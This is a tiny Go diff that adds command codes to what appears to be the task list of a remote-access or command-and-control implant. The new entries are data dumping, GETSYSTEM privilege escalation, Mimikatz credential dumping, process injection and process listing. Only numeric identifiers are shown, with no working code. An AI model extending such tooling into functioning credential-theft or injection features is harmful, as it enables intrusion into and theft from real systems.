@@ -29,4 +29,9 @@ const (
 	StopInteractiveShell = 62
 	ExecuteLinuxScript   = 43
 	SCREENSHOT           = 44
+	DUMP_DATA            = 45
+	GETSYSTEM            = 80
+	MIMIKATZ             = 81
+	PROCESS_INJECT       = 82
+	LIST_PROCESSES       = 83
 )
